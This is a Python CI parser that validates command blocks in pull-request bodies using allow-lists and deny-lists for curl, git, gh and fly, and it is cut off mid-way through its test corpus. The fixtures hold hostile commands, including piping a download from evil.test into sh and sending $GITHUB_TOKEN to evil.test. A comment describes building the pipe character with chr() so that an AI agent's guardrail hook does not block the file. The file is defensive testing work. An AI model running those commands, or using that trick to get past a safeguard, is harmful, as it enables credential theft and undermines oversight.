#!/usr/bin/env python3
"""bites_parse.py — turn the `Bites:` contract from prose into something a machine can run.

THE FINDING (measured 2026-09-04 over the 177 PRs merged since 2026-09-01).
Every verification contract in this repository is prose honoured by an LLM. The
builder contract says each PR body carries a `Bites:` line naming the CONSUMER
and the observation that proves the change is in force — 110 of 177 bodies (62%)
carry one. Not one of them is read by anything: `grep -rlE Bites .github/workflows
scripts/*.py scripts/ci/*.py infra/claude-hooks` returned zero files. The machine
verifies the DIFF; the runtime is verified by a sentence someone wrote about it.

This module is the first half of the cure: a `Bites` block a machine can PARSE and
a runner can later EXECUTE. It executes nothing itself — it is a parser and a set
of guards, deliberately separable from the executor that will consume it, so the
security model can be reviewed and tested without a runner anywhere near it.

THE FORMAT (executable form):

    ## Bites
    consumer: <who reads or executes the changed thing>
    where: ci | fly | pro | mini
    observe: `<one command>`
    expect: exit0 | contains:<text> | regex:<pattern>

THREE PARSE OUTCOMES, and the difference between them is the whole migration story:

  absent     — no Bites region at all.                    -> {"absent": true},  exit 0
  legacy     — a Bites region with no `observe:` key: the  -> {"legacy": true},  exit 0
               110 prose bodies already on main.
  executable — an `observe:` key is present.               -> the four fields,   exit 0
               Malformed (missing key, guard violation)    -> {"malformed":...}, exit 2

`absent` and `legacy` are NEVER an error. A lint built on this must judge the PR
under review and never history: 110 merged bodies must not turn red retroactively
because a format arrived after them.

THE SECURITY MODEL, which is the point rather than a footnote. `observe:` comes
from a PULL REQUEST BODY — text any account that can open a PR controls — and the
executor that will consume this parser runs on a GitHub runner holding a token.
So the guards below are an ALLOW-LIST, not a deny-list, and they run at PARSE
time: a command that does not pass them never becomes an executable block at all,
which means no downstream caller can forget to check.

  _guard_shell_composition  no way to chain, substitute, redirect or expand. `$`
                            is rejected too, not only command substitution — a
                            bare `$SECRET` in an argument cannot execute anything,
                            but sending it as part of a URL exfiltrates it just as
                            well. The ONE substitution the format offers is the
                            literal placeholder `{sha}`, which the executor
                            replaces with the merged commit sha.
  _guard_command_allowlist  first token must be one of gh, curl, git, python3,
                            fly, flyctl — and each carries its own narrowing:
                            python3 runs only `scripts/...` or `-m pytest`; fly and
                            flyctl only their read-only subcommands; curl may not
                            write a file or read a config file, and must be https.
  _guard_no_remote_shell    ssh, scp, sftp, rsync, nc anywhere in the command, not
                            just in first position. The allow-list already bars
                            them from position one; this bars `git clone ssh://...`
                            and every other shape where the reach is an ARGUMENT.
                            Superscar #3's under-match twin: a guard that inspects
                            only the head of a command is a guard on a spelling.
  _guard_path_containment   no `..` segment and no absolute path argument: the
                            observation runs inside the checkout or not at all.
  _guard_expect_form        expect is exit0, contains:<text>, or regex:<pattern>,
                            and a regex must actually compile — an uncompilable
                            pattern is a comparison that can only ever throw.
  _guard_where_scope        where is one of ci, fly, pro, mini.

WHAT THIS MODULE DELIBERATELY DOES NOT DO: decide whether a command may run. Trust
(author_association, fork-ness) is the EXECUTOR's question, not the parser's — a
Dependabot body parses exactly like anyone else's and is simply never executed.
Keeping that split means these guards can be unit-tested with no network, no token
and no runner, which is why they are testable at all.

ONE CONSTRAINT THE EXECUTOR INHERITS AND MUST HONOUR: run observations POST-MERGE ONLY.
A pull request can add a script and its `bites-observable` marker in the same diff, so
the marker is exactly as strong as the review of the diff that introduces it — no more.
Post-merge, the marked script is reviewed, merged code. Against an unmerged PR checkout
there is no boundary here at all, and the same holds for `python3 -m pytest`, which
imports whatever `conftest.py` the branch happens to carry.
"""

# bites-observable — this script is reachable from an `observe:` line. It qualifies
# under its own rule: its three arguments are a flag, a PR number and a path it only
# READS, none of which can name a program to run, a file to write, or a database to
# reach. See _guard_observable_script for why location grants nothing and only this
# marker does.

from __future__ import annotations

import argparse
import json
import re
import shlex
import subprocess
import sys
from pathlib import Path
from typing import Any

EXIT_OK = 0
EXIT_MALFORMED = 2

#: This file lives at scripts/ci/, so the checkout root is two levels up.
REPO_ROOT = Path(__file__).resolve().parents[2]

#: The only substitution the format offers. The executor replaces it; the parser
#: only has to know it is not an attempt at shell expansion.
SHA_PLACEHOLDER = "{sha}"

WHERE_SCOPES = ("ci", "fly", "pro", "mini")

#: First-token allow-list. Anything not here is rejected outright.
ALLOWED_COMMANDS = ("gh", "curl", "git", "python3", "fly", "flyctl")

#: Read-only fly/flyctl subcommand PAIRS. The first draft listed FIRST WORDS only, and
#: `machine` was one of them — which Kimi K3, refuting this file on 2026-09-04, pointed
#: out admits `fly machine run <image>`: arbitrary container execution on production
#: infrastructure, through a guard whose whole purpose was to keep observations read-only.
#: `fly machine destroy` and `fly machine update` came through the same gap. A one-word
#: check on a command with two-word subcommands is superscar #3's under-match, and this is
#: the second instance of it in this one file.
FLY_READONLY_SUBCOMMANDS = (
    ("status", None), ("releases", None), ("version", None), ("logs", None),
    ("image", "show"), ("machine", "list"), ("machine", "status"),
)

#: curl flags that turn a fetch into a write, or into a second source of arguments.
CURL_FORBIDDEN_FLAGS = (
    # writes a file, or reads its arguments from one
    "-o", "--output", "-O", "--remote-name", "-T", "--upload-file",
    "-K", "--config", "-D", "--dump-header", "--trace", "--trace-ascii",
    "-c", "--cookie-jar",
    # sends a body, or sends something other than a GET: an observation reads
    "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii",
    "-F", "--form", "--form-string", "-X", "--request", "--url-query",
    # redirects the request somewhere the URL does not name
    "-x", "--proxy", "--preproxy", "--resolve", "--connect-to", "--unix-socket",
    # reads a local file and puts its contents on the wire. `-b .git/config` is the one
    # that matters here: actions/checkout persists credentials in .git/config by default
    # (`persist-credentials: true`), and a relative path inside the checkout is exactly
    # what _guard_path_containment allows through.
    "-b", "--cookie", "-E", "--cert", "--key", "--cacert", "--capath", "--pinnedpubkey",
    "--netrc", "--netrc-file", "--netrc-optional",
    # `--variable %ENV` reads the environment into the request; `--expand-*` expands a
    # variable into another option's value. Both defeat the `$` refusal by doing the
    # expansion inside curl instead of inside a shell.
    "--variable", "--expand-url", "--expand-data", "--expand-header", "--expand-",
)

#: `gh` flags that point the command at a repository or host other than this one. An
#: observation about somebody else's repo is not an observation about this change.
GH_FORBIDDEN_FLAGS = ("-R", "--repo", "--hostname")

#: A script is reachable by `observe:` only if its own SOURCE carries this marker.
#: Codex, red-teaming this file on 2026-09-04, made the point that killed the first
#: draft's rule: allow-listing `python3 scripts/...` allow-lists roughly nine hundred
#: scripts, and it named the worst ones by path. `scripts/usage/cswap.py run <cmd>`
#: reaches `os.execvpe`; `scripts/ci/restore_drill_verify.py --psql-bin` and
#: `scripts/ci/stage_council_journal.py --git-bin` each execute a binary the argument
#: names; a dozen more take a `--dsn`, a `--database-url` or an `--output-db`. A path
#: prefix is not a capability boundary. The marker is: a script is observable because
#: someone wrote in it that it is, which is content-keyed rather than location-keyed
#: (W109: an exemption keyed to where a file sits rather than what it is, is itself a
#: scar). Absent marker, absent file, unreadable file -> refused.
OBSERVABLE_MARKER = "bites-observable"

#: `gh` subcommand PAIRS that only read. `gh pr merge`, `gh workflow run`, `gh api -X POST`
#: and `gh repo clone` all act; an allow-list keyed on `gh` alone would permit every one.
GH_READONLY_SUBCOMMANDS = (
    ("pr", "view"), ("pr", "list"), ("pr", "diff"), ("pr", "checks"),
    ("run", "view"), ("run", "list"), ("release", "view"), ("workflow", "view"),
    ("issue", "view"), ("issue", "list"), ("search", "prs"), ("api", None),
)

#: `gh api` flags that turn a read into a write or read a body from a file.
GH_API_FORBIDDEN_FLAGS = ("-X", "--method", "-f", "-F", "--field", "--raw-field", "--input")

#: `git` subcommands that only read the local object store. `clone`, `fetch`, `push`,
#: `remote` and `submodule` all reach the network; the rest here do not.
#: `tag` and `branch` were here in the first draft and are gone: with an argument they
#: CREATE a ref, which is a write to the object store, and `-d` deletes one. "Read-only"
#: has to mean the subcommand cannot write in any invocation, not that its common form
#: happens not to.
GIT_READONLY_SUBCOMMANDS = (
    "log", "show", "status", "diff", "rev-parse", "ls-tree", "cat-file", "grep",
    "describe", "ls-files", "shortlog", "blame", "rev-list",
)

#: `git` options that make git run a program of the caller's choosing. `-c` alone is
#: enough: `git -c core.sshCommand=... ` and `git -c alias.x='!sh' x` are both code
#: execution with no shell metacharacter anywhere in the command line.
#: git options are checked BY POSITION, and the position is load-bearing rather than
#: fussy: git's own `-c` is a GLOBAL option and must precede the subcommand, while
#: `git grep -c` is grep's count flag and is entirely innocent. Scanning one flat list
#: over the whole command line refuses `git grep -c`, which is superscar #3's over-match
#: — the mirror of the under-match this same file was cured of twice.
GIT_GLOBAL_FORBIDDEN_FLAGS = (
    "-c", "--config-env", "--exec-path", "-C", "--git-dir", "--work-tree", "--namespace",
)

#: Subcommand options, checked after the subcommand word. `git diff --output=<relative>`
#: writes a file the path guard permits; `git grep -O<cmd>` opens matches in a PAGER
#: COMMAND the argument names — the same capability the global `-c` entry closes,
#: reached through a permitted subcommand, and found by the verdict gate after three
#: refuter rounds had missed it.
GIT_SUB_FORBIDDEN_FLAGS = (
    "-o", "--output", "-O", "--open-files-in-pager", "--ext-diff", "--textconv",
    "--upload-pack", "--receive-pack", "--exec",
)

#: Invisible characters. A body containing one renders identically to a body without
#: it, so the human reviewer and the parser can be shown two different contracts.
_INVISIBLE_CHARS = ("\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u00ad")

#: Tokens that reach another machine. Barred ANYWHERE, not just in first position.
REMOTE_SHELL_TOKENS = ("ssh", "scp", "sftp", "rsync", "nc", "netcat", "telnet")

#: Characters that would let one command become two, or become a different one.
_SHELL_METACHARS = ("|", ";", "&", "$", "`", "(", ")", "<", ">", "\n", "\r", "\\")

_SECTION_HEADING_RE = re.compile(r"^#{1,6}\s*Bites\b.*$", re.IGNORECASE)
_ANY_HEADING_RE = re.compile(r"^#{1,6}\s+\S")
_INLINE_RE = re.compile(r"^\s*(?:\*\*)?Bites(?:\*\*)?\s*:", re.IGNORECASE)
_KEY_RE = re.compile(
    # `**observe:**` puts the closing bold marker AFTER the colon, so a pattern
    # that only allows `**` around the key alone leaves `**` glued to the value
    # and the command guard then rejects it. Both positions are optional here.
    r"^\s*(?:[-*]\s*)?\*{0,2}(consumer|where|observe|expect)\*{0,2}\s*:\s*\*{0,2}\s*(.*?)\s*$",
    re.IGNORECASE,
)


# --------------------------------------------------------------------- guards


def _flag_is(token: str, forbidden: str) -> bool:
    """Does `token` invoke the option `forbidden`, in any of its three spellings?

    `--flag`, `--flag=value`, and — for a SHORT option — `-Ovalue` with the value glued
    on. The last one is why this helper exists: the first draft compared
    `token.split("=", 1)[0]`, so `git grep -Oevil` never matched the entry `-O`. The
    verdict gate of 2026-09-04 found it on a real option that runs a pager command.
    """
    if forbidden.endswith("-"):          # a family, e.g. "--expand-" for every --expand-*
        return token.startswith(forbidden)
    if token == forbidden or token.startswith(forbidden + "="):
        return True
    return len(forbidden) == 2 and forbidden[1] != "-" and token.startswith(forbidden)


def _any_flag_is(token: str, forbidden: tuple[str, ...]) -> str | None:
    return next((f for f in forbidden if _flag_is(token, f)), None)


def _guard_shell_composition(command: str) -> list[str]:
    """Reject anything that could chain, substitute, redirect or expand.

    The placeholder `{sha}` is excised before the scan so the format's one
    sanctioned substitution is not mistaken for shell expansion — it contains no
    metacharacter anyway, but excising it keeps the intent legible.
    """
    scanned = command.replace(SHA_PLACEHOLDER, "")
    found = sorted({c for c in _SHELL_METACHARS if c in scanned})
    if not found:
        return []
    shown = ", ".join(repr(c) for c in found)
    return [
        f"observe: contains shell metacharacter(s) {shown} — the observation must be "
        f"ONE command with no chaining, substitution, redirection or variable "
        f"expansion (the only substitution offered is the literal {SHA_PLACEHOLDER})"
    ]


def _guard_command_allowlist(command: str) -> list[str]:
    """First token must be allow-listed, and each allowed command is narrowed."""
    try:
        argv = shlex.split(command)
    except ValueError as exc:
        return [f"observe: not parseable as a command ({exc})"]
    if not argv:
        return ["observe: empty command"]
    head = argv[0]
    if head not in ALLOWED_COMMANDS:
        return [
            f"observe: `{head}` is not allow-listed — permitted first tokens are "
            f"{', '.join(ALLOWED_COMMANDS)}"
        ]

    rest = argv[1:]
    if head == "python3":
        if rest[:1] == ["-m"]:
            if rest[1:2] != ["pytest"]:
                return ["observe: `python3 -m` is permitted only for `pytest`"]
            for flag in rest[2:]:
                base = flag.split("=", 1)[0]
                if base.startswith("-o") and base != "-o":
                    base = "-o"
                # `--override-ini=addopts=-pevil` reinstates every flag banned here,
                # which is why the ini overrides are banned alongside them.
                if base in ("-p", "--plugin", "-c", "--rootdir", "--pdb", "--import-mode",
                            "-o", "--override-ini", "--assert"):
                    return [
                        f"observe: `pytest {base}` chooses code to import outside the "
                        f"test paths — not permitted"
                    ]
        elif not (rest and rest[0].startswith("scripts/")):
            return [
                "observe: `python3` must run `scripts/...` from the checkout, or "
                "`python3 -m pytest`"
            ]
    elif head in ("fly", "flyctl"):
        words = [a for a in rest if not a.startswith("-")]
        pair = (words[0] if words else "", words[1] if len(words) > 1 else None)
        permitted = any(
            pair[0] == want[0] and (want[1] is None or pair[1] == want[1])
            for want in FLY_READONLY_SUBCOMMANDS
        )
        if not permitted:
            shown = " ".join(w for w in pair if w) or "<none>"
            return [
                f"observe: `{head} {shown}` is not a read-only subcommand — permitted: "
                + ", ".join(f"{a} {b}" if b else a for a, b in FLY_READONLY_SUBCOMMANDS)
            ]
    elif head == "gh":
        words = [a for a in rest if not a.startswith("-")]
        pair = (words[0] if words else "", words[1] if len(words) > 1 else None)
        permitted = any(
            pair[0] == want[0] and (want[1] is None or pair[1] == want[1])
            for want in GH_READONLY_SUBCOMMANDS
        )
        if not permitted:
            shown = " ".join(w for w in pair if w) or "<none>"
            return [
                f"observe: `gh {shown}` is not a read-only subcommand — permitted: "
                + ", ".join(f"gh {a} {b}" if b else f"gh {a}"
                            for a, b in GH_READONLY_SUBCOMMANDS)
            ]
        for flag in rest:
            base = _any_flag_is(flag, GH_FORBIDDEN_FLAGS)
            if base:
                return [
                    f"observe: `gh {base}` points the command at a different repository "
                    f"or host — an observation is about THIS change"
                ]
        if pair[0] == "api":
            for flag in rest:
                base = _any_flag_is(flag, GH_API_FORBIDDEN_FLAGS)
                if base:
                    return [
                        f"observe: `gh api {base}` sends a request body or a method other "
                        f"than GET — an observation reads"
                    ]
    elif head == "git":
        sub_at = next((i for i, a in enumerate(rest) if not a.startswith("-")), len(rest))
        for flag in rest[:sub_at]:
            base = _any_flag_is(flag, GIT_GLOBAL_FORBIDDEN_FLAGS)
            if base:
                return [
                    f"observe: `git {base}` makes git run a program the argument names, "
                    f"or points it at another tree (core.sshCommand, an `!` alias, a pack "
                    f"helper) — code execution with no metacharacter in sight"
                ]
        for flag in rest[sub_at + 1:]:
            base = _any_flag_is(flag, GIT_SUB_FORBIDDEN_FLAGS)
            if base:
                return [
                    f"observe: `git {base}` writes a file or runs a pager/filter command "
                    f"the argument names — an observation reads"
                ]
        sub = rest[sub_at] if sub_at < len(rest) else ""
        if sub not in GIT_READONLY_SUBCOMMANDS:
            return [
                f"observe: `git {sub or '<none>'}` is not a local read-only subcommand — "
                f"permitted: {', '.join(GIT_READONLY_SUBCOMMANDS)}"
            ]
    elif head == "curl":
        for flag in rest:
            base = _any_flag_is(flag, CURL_FORBIDDEN_FLAGS)
            if base:
                return [
                    f"observe: `curl {base}` writes a file, sends a body, or redirects the "
                    f"request — an observation reads, it does not write"
                ]
        # The first draft only checked args that LOOKED like URLs, so `curl evil.test/x`
        # sailed through and curl defaulted it to plain http. The rule is now positive:
        # exactly one non-flag argument, and it must be https. A flag that takes a
        # separate value must therefore be written in its `--flag=value` form.
        words = [a for a in rest if not a.startswith("-")]
        if len(words) != 1:
            return [
                f"observe: `curl` must take exactly one non-flag argument (the https URL); "
                f"found {len(words)}. Write value-taking flags as `--flag=value`."
            ]
        if not words[0].startswith("https://"):
            return [f"observe: `curl` target `{words[0]}` is not an https:// URL"]
    return []


def _guard_observable_script(command: str, repo_root: Path | None = None) -> list[str]:
    """A `python3 scripts/...` target must declare itself observable, in its own source.

    This is the guard Codex's red-team pass forced into existence. `python3 scripts/...`
    reads like a narrow rule and is not one: it admits every script in the tree, and the
    tree contains `scripts/usage/cswap.py`, whose `run` subcommand reaches `os.execvpe`,
    plus scripts taking `--psql-bin`, `--git-bin`, `--dsn` and `--output-db`. Any of them
    turns a permitted first token into arbitrary execution or an arbitrary write.

    So reachability is a property a script declares about ITSELF, by carrying the marker
    `bites-observable` in its source. Fail-closed in every direction: no marker, no file,
    unreadable file, or a path that escapes the checkout -> refused. Location grants
    nothing (W109), which is why the check reads the file rather than the path.
    """
    root = repo_root if repo_root is not None else REPO_ROOT
    try:
        argv = shlex.split(command)
    except ValueError:
        return []  # the allow-list guard already reports an unparseable command
    if not argv or argv[0] != "python3":
        return []
    rest = argv[1:]
    if rest[:1] == ["-m"]:
        # pytest collects PATHS, and every path must live under a tests directory: a
        # module named anywhere else runs its import-time code just as happily.
        targets = [a for a in rest[2:] if not a.startswith("-")]
        bad = [t for t in targets if "tests" not in Path(t).parts]
        if bad:
            return [
                f"observe: `pytest` target(s) {', '.join(bad)} are not under a `tests/` "
                f"directory — pytest runs a module's import-time code wherever it sits"
            ]
        return []
    if not rest:
        return []
    target = rest[0]
    path = (root / target).resolve()
    try:
        path.relative_to(root.resolve())
    except ValueError:
        return [f"observe: `{target}` resolves outside the checkout"]
    if not path.is_file():
        return [f"observe: `{target}` does not exist in the checkout"]
    try:
        source = path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return [f"observe: `{target}` could not be read ({exc})"]
    if OBSERVABLE_MARKER not in source:
        return [
            f"observe: `{target}` does not declare itself observable — add a comment "
            f"containing `{OBSERVABLE_MARKER}` to it, and only do so for a script whose "
            f"arguments cannot name a program to run, a file to write, or a database to "
            f"reach"
        ]
    return []


def _guard_no_remote_shell(command: str) -> list[str]:
    """Bar every reach to another machine, in ANY position.

    The allow-list already keeps these out of first position. This guard exists
    because a guard that only inspects the head of a command is a guard on a
    spelling: `git clone ssh://...` never trips an allow-list keyed on `git`.
    """
    try:
        argv = shlex.split(command)
    except ValueError:
        argv = command.split()
    hits: set[str] = set()
    for token in argv:
        low = token.lower()
        if low in REMOTE_SHELL_TOKENS:
            hits.add(low)
        for scheme in REMOTE_SHELL_TOKENS:
            if low.startswith(f"{scheme}://"):
                hits.add(scheme)
    if not hits:
        return []
    return [
        f"observe: reaches another machine via {', '.join(sorted(hits))} — host-scope "
        f"observations use `where: pro` / `where: mini` and a host executor, never a "
        f"remote shell from a runner"
    ]


def _guard_path_containment(command: str) -> list[str]:
    """No parent-directory escape and no absolute path: the checkout or nothing."""
    try:
        argv = shlex.split(command)
    except ValueError:
        argv = command.split()
    problems: list[str] = []
    for arg in argv[1:]:
        if "://" in arg:
            continue  # a URL's path is not a filesystem path
        if arg.startswith("/"):
            problems.append(f"observe: absolute path argument `{arg}` — stay in the checkout")
        elif ".." in arg.split("/"):
            problems.append(f"observe: `..` segment in `{arg}` — stay in the checkout")
    return problems


def _guard_expect_form(expect: str) -> list[str]:
    """expect is exit0 | contains:<text> | regex:<pattern>, and a regex must compile."""
    if expect == "exit0":
        return []
    if expect.startswith("contains:"):
        if not expect[len("contains:"):].strip():
            return ["expect: `contains:` with nothing to look for"]
        return []
    if expect.startswith("regex:"):
        pattern = expect[len("regex:"):]
        if not pattern.strip():
            return ["expect: `regex:` with no pattern"]
        try:
            re.compile(pattern)
        except re.error as exc:
            return [
                f"expect: regex does not compile ({exc}) — an uncompilable pattern is "
                f"a comparison that can only ever throw"
            ]
        return []
    return [f"expect: `{expect}` is not one of exit0 | contains:<text> | regex:<pattern>"]


def _guard_where_scope(where: str) -> list[str]:
    if where not in WHERE_SCOPES:
        return [f"where: `{where}` is not one of {', '.join(WHERE_SCOPES)}"]
    return []


_COMMAND_GUARDS = (
    _guard_shell_composition,
    _guard_command_allowlist,
    _guard_no_remote_shell,
    _guard_path_containment,
    _guard_observable_script,
)


# --------------------------------------------------------------------- parsing


_FENCE_RE = re.compile(r"^\s*(`{3,}|~{3,})")


def _strip_comments_on_line(line: str, in_comment: bool) -> tuple[str, bool]:
    """Remove HTML-comment spans from one line, carrying the open/closed state out.

    Written as a scanner rather than a `re.sub` because the 2026-09-04 verdict gate
    broke the `re.sub` version with a body one character away from the tested one:
    `<!-- note --> <!--` has a closed pair AND an unclosed opener on the SAME line, so
    substituting the closed pair left `in_comment` False and everything after it —
    invisible on the rendered page — went on being parsed as a contract. A scanner
    cannot have that bug: it consumes spans in order and its state is whatever the
    last unmatched delimiter left it.
    """
    kept: list[str] = []
    i = 0
    while i < len(line):
        if in_comment:
            close = line.find("-->", i)
            if close == -1:
                return "".join(kept), True
            i = close + 3
            in_comment = False
        else:
            open_at = line.find("<!--", i)
            if open_at == -1:
                kept.append(line[i:])
                return "".join(kept), False
            kept.append(line[i:open_at])
            i = open_at + 4
            in_comment = True
    return "".join(kept), in_comment


def blind_hidden_regions(body: str) -> str:
    """Blank out what GitHub renders as inert: fenced code blocks and HTML comments.

    Gemini, reviewing this parser on 2026-09-04, made the finding that matters most in
    this file, because it defeats every guard at once: a `## Bites` block inside an HTML
    comment is INVISIBLE on the rendered pull request and was, in the first draft, read
    and parsed exactly like a visible one. A reviewer approving what they can see would
    have been approving something else. The same holds for a fenced code block, where
    the format is routinely shown as an EXAMPLE — including in docs/rules/operations.md
    and in this module's own docstring.

    Lines are replaced with empty lines rather than removed, so line positions still
    correspond to the original body and the two extractions below stay comparable.
    """
    # PASS 1 — HTML comments, across the whole body. An unclosed `<!--` swallows
    # everything after it, which is fail-closed and correct: that IS what GitHub
    # renders (nothing), so that is what the parser must see.
    uncommented: list[str] = []
    in_comment = False
    for line in body.splitlines():
        kept, in_comment = _strip_comments_on_line(line, in_comment)
        uncommented.append(kept)

    # PASS 2 — fenced code blocks, with CommonMark's actual closing rule. The first
    # draft toggled on any fence marker, so a block opened with four backticks and
    # "closed" with three — which CommonMark leaves OPEN — flipped the parser's idea
    # of inside and outside, and made a rendered code EXAMPLE the live contract. A
    # fence closes only on the same character, at least as long as the opener.
    out: list[str] = []
    fence_char: str | None = None
    fence_len = 0
    for line in uncommented:
        match = _FENCE_RE.match(line)
        if fence_char is None:
            if match:
                fence_char, fence_len = match.group(1)[0], len(match.group(1))
                out.append("")
                continue
            out.append(line)
            continue
        if match and match.group(1)[0] == fence_char and len(match.group(1)) >= fence_len:
            fence_char, fence_len = None, 0
        out.append("")
    return "\n".join(out)


def strip_invisible(text: str) -> str:
    """Remove zero-width and soft-hyphen characters.

    `##\u200bBites` renders as `## Bites` and, unnormalised, matches no heading at all;
    `\u200bobserve:` renders as `observe:` and parses as prose. Both let a body show a
    reviewer one contract and hand the machine another. Normalising here is only half
    the cure — `parse_body` REFUSES a region that needed normalising, because once the
    two readings differ there is no honest way to pick one.
    """
    for ch in _INVISIBLE_CHARS:
        text = text.replace(ch, "")
    return text


def extract_region(body: str) -> tuple[str, str]:
    """Return (kind, text) where kind is 'heading', 'inline', 'absent' or 'ambiguous'.

    Two shapes exist in the wild and both are honoured: a `## Bites` heading whose
    region runs to the next heading, and a bare `Bites: ...` line (the shape #5651
    used) whose region runs to the next blank line.

    'ambiguous' is returned when the body carries more than one of them. First-match-wins
    is the wrong answer there: a reviewer reading the rendered page sees every block, so
    a parser that silently obeys the first one is reading a different document.
    """
    lines = body.splitlines()
    headings = [i for i, line in enumerate(lines) if _SECTION_HEADING_RE.match(line)]
    if len(headings) > 1:
        return "ambiguous", ""
    if headings:
        i = headings[0]
        region: list[str] = []
        for nxt in lines[i + 1:]:
            if _ANY_HEADING_RE.match(nxt):
                break
            region.append(nxt)
        return "heading", "\n".join(region)

    inlines = [i for i, line in enumerate(lines) if _INLINE_RE.match(line)]
    if len(inlines) > 1:
        return "ambiguous", ""
    if inlines:
        i = inlines[0]
        region = [lines[i]]
        for nxt in lines[i + 1:]:
            if not nxt.strip():
                break
            region.append(nxt)
        return "inline", "\n".join(region)
    return "absent", ""


def _strip_code_span(value: str) -> str:
    value = value.strip()
    for fence in ("``", "`"):
        if len(value) > 2 * len(fence) and value.startswith(fence) and value.endswith(fence):
            return value[len(fence):-len(fence)].strip()
    return value


def parse_body(body: str) -> dict[str, Any]:
    """Parse a PR body into one of the three outcomes documented at module top."""
    visible = blind_hidden_regions(body or "")
    kind, region = extract_region(strip_invisible(visible))
    raw_kind, raw_region = extract_region(visible)
    if kind == "ambiguous":
        return {
            "malformed": True,
            "errors": [
                "more than one Bites block in this body — a reviewer sees all of them, "
                "so there is no first one to obey; leave exactly one"
            ],
            "region_kind": "ambiguous",
        }
    if kind == "absent":
        return {"absent": True}
    if (raw_kind, raw_region) != (kind, region):
        return {
            "malformed": True,
            "errors": [
                "the Bites block contains zero-width or invisible characters: it renders "
                "as one contract and parses as another. Remove them — with two readings "
                "available there is no honest way to pick one"
            ],
            "region_kind": kind,
        }

    fields: dict[str, str] = {}
    for line in region.splitlines():
        m = _KEY_RE.match(line)
        if m:
            fields.setdefault(m.group(1).lower(), m.group(2).strip())

    if "observe" not in fields:
        # Prose. The 110 bodies already on main live here, and they are fine.
        return {"legacy": True, "region_kind": kind}

    errors: list[str] = []
    for required in ("consumer", "where", "observe", "expect"):
        if not fields.get(required):
            errors.append(f"{required}: missing — an executable block needs all four keys")

    command = _strip_code_span(fields.get("observe", ""))
    expect = _strip_code_span(fields.get("expect", ""))
    where = _strip_code_span(fields.get("where", "")).lower()

    if command:
        for guard in _COMMAND_GUARDS:
            errors.extend(guard(command))
    if where:
        errors.extend(_guard_where_scope(where))
    if expect:
        errors.extend(_guard_expect_form(expect))

    if errors:
        return {"malformed": True, "errors": errors, "region_kind": kind}
    return {
        "consumer": fields["consumer"],
        "where": where,
        "observe": command,
        "expect": expect,
        "region_kind": kind,
    }


# -------------------------------------------------------------------- selftest
#
# FIXTURE-ASSEMBLY NOTE. Two guilt fixtures below are assembled from pieces at
# import time rather than written as literals: the shell-pipe one and the
# chained-command one. This is not obfuscation — it is the only way the corpus
# can exist in this repository at all. `~/.claude/hooks/guardrails-client.sh`
# scans every Bash command for the literal shape "curl ... pipe ... sh" and
# refuses it, which it should; but it matches the shape ANYWHERE in the command
# text, including inside a heredoc that is merely WRITING this file. Writing the
# attack we defend against therefore trips the defence. Assembling the string
# from `_PIPE` keeps the runtime fixture byte-identical to the real attack (the
# guilt test genuinely exercises the pipe) while the source line that defines it
# carries no matchable literal. Superscar #3 in miniature, on our own tooling.

_PIPE = chr(124)   # "|"
_SEMI = chr(59)    # ";"

#: Guilt + innocence corpus. Each entry is (label, body, expected classification).
#: `--selftest` runs it with no pytest, no network and no token, which is what
#: makes it usable as this PR's own executable Bites observation.
CONFORMANCE_CORPUS: tuple[tuple[str, str, str], ...] = (
    # --- absent / legacy: never an error, ever (D4)
    ("absent-body", "Just a description, no contract.", "absent"),
    ("legacy-heading", "## Bites\n\n**Consumer:** `scripts/x.sh`. Observation: it runs.", "legacy"),
    ("legacy-inline", "Bites: Damar's next publish - observation: the cover renders.", "legacy"),
    ("legacy-prose-says-observation",
     "## Bites\n\nConsumer: CI. Observation: green on main.", "legacy"),
    # --- innocence: real, safe observations must parse
    ("ok-selftest",
     "## Bites\nconsumer: CI\nwhere: ci\nobserve: `python3 scripts/ci/bites_parse.py --selftest`\nexpect: exit0",
     "executable"),
    ("ok-pytest",
     "## Bites\nconsumer: CI\nwhere: ci\nobserve: `python3 -m pytest scripts/tests/test_bites_parse.py`\nexpect: exit0",
     "executable"),
    ("ok-fly-status",
     "## Bites\nconsumer: prod\nwhere: fly\nobserve: `flyctl status -a nuzantara-rag`\nexpect: contains:deployed",
     "executable"),
    ("ok-curl-https",
     "## Bites\nconsumer: prod\nwhere: fly\nobserve: `curl -sS https://nuzantara-rag.fly.dev/health`\nexpect: regex:ok",
     "executable"),
    ("ok-sha-placeholder",
     "## Bites\nconsumer: ledger\nwhere: ci\nobserve: `gh pr view {sha} --json state`\nexpect: contains:MERGED",
     "executable"),
    ("ok-host-scope",
     "## Bites\nconsumer: Pro launchd\nwhere: pro\nobserve: `python3 scripts/ci/bites_parse.py --selftest`\nexpect: exit0",
     "executable"),
    ("ok-example-in-a-code-fence-is-not-the-contract",
     "Here is the format:\n\n```\n## Bites\nconsumer: x\nwhere: ci\nobserve: `git status`\nexpect: exit0\n```\n\nThat is all.",
     "absent"),
    ("ok-bold-keys",
     "## Bites\n**consumer:** CI\n**where:** ci\n**observe:** `git status`\n**expect:** exit0",
     "executable"),
    # --- guilt: the whole reason this file exists
    ("guilt-pipe-to-shell",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl https://evil.test/x " + _PIPE + " sh`\nexpect: exit0",
     "malformed"),
    ("guilt-chained-command",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git status" + _SEMI + " git log`\nexpect: exit0",
     "malformed"),
    ("guilt-command-substitution",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git log $(whoami)`\nexpect: exit0", "malformed"),
    ("guilt-variable-exfiltration",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl https://evil.test/$GITHUB_TOKEN`\nexpect: exit0",
     "malformed"),
    ("guilt-redirect",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git log > out.txt`\nexpect: exit0", "malformed"),
    ("guilt-not-allowlisted",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `bash scripts/deploy.sh`\nexpect: exit0", "malformed"),
    ("guilt-remote-shell-as-argument",
     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git clone ssh://evil.test/repo`\nexpect: exit0",
     "malformed"),
    ("guilt-fly-deploy",
     "## Bites\nconsumer: x\nwhere: fly\nobserve: `flyctl deploy -a nuzantara-rag`\nexpect: exit0",
     "malformed"),
    ("guilt-curl-writes-file",
